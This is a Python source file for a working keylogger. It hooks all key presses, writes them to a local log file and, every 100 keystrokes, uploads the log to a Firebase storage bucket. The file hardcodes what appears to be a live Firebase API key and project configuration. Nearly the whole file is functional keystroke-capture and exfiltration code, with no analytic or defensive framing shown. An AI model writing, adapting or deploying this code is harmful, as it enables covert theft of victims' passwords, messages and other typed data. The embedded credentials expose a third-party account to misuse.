import keyboard
import pyrebase
import time
import os

# Firebase configuration
config = {
    "apiKey": "AIzaSyAboBophk8DAJBXmn4ltGZyGlYZnRqEpXQ",
    "authDomain": "keylogger-e4335.firebaseapp.com",
    "databaseURL": "https://keylogger-e4335-default-rtdb.asia-southeast1.firebasedatabase.app/",
    "projectId": "keylogger-e4335",
    "storageBucket": "keylogger-e4335.appspot.com",
    "messagingSenderId": "880295281065",
    "appId": "1:880295281065:web:31b4dba6661594ba84c4b8",
    "measurementId": "G-YNJP3TKYWM"
}

# Initialize Firebase
firebase = pyrebase.initialize_app(config)
storage = firebase.storage()

currentPosition = 0
capsLockActive = False
log_file = "log.txt"

# Function to upload the log file to Firebase
def upload_log():
    try:
        # Upload log.txt file to Firebase Storage
        storage.child("log.txt").put(log_file)
        print("Log file uploaded to Firebase.")
    except Exception as e:
        print(f"Error uploading log: {e}")

# Function to write key presses to the file
def writeToFile(e):
    global currentPosition, capsLockActive

    # If the key is a normal alphabetic key (e.g., "a", "b", etc.)
    if e.event_type == keyboard.KEY_DOWN:
        letter = e.name
        
        # If the key name is None (special key), handle it appropriately
        if not letter:
            return
        
        # Handle specific key cases
        if letter == 'space':
            letter = " "
        elif letter == 'enter':
            letter = "\n"
        elif letter == 'backspace':
            # Remove the last character from the file
            with open(log_file, 'r+') as f:
                f.seek(0, 2)
                size = f.tell()
                if size > 0:
                    f.seek(size - 1)
                    nextchr = f.read()
                    if nextchr == "\n":
                        f.seek(size - 2)
                    else:
                        f.seek(size - 1)
                    f.truncate()
                    if currentPosition > 0:
                        currentPosition -= 1
            return
        elif letter == 'caps lock':
            capsLockActive = not capsLockActive
            return
        
        # Adjust for caps lock if active and letter is alphabetic
        if capsLockActive and letter.isalpha():
            letter = letter.upper()

        # Write the valid key to the log file
        with open(log_file, "a") as f:
            f.write(letter)
            currentPosition += 1

        # Every 100 key presses, upload the log to Firebase
        if currentPosition % 100 == 0:
            upload_log()

# Function to listen for key events
def start_keylogger():
    print("Keylogger started... Press 'Esc' to stop.")
    
    # Listening to the keyboard for key events
    keyboard.hook(writeToFile)
    
    # Wait for the 'Esc' key to stop the program
    while True:
        if keyboard.is_pressed('esc'):
            print("Keylogger stopped.")
            break
        time.sleep(0.1)

# Start the keylogger
if __name__ == "__main__":
    start_keylogger()
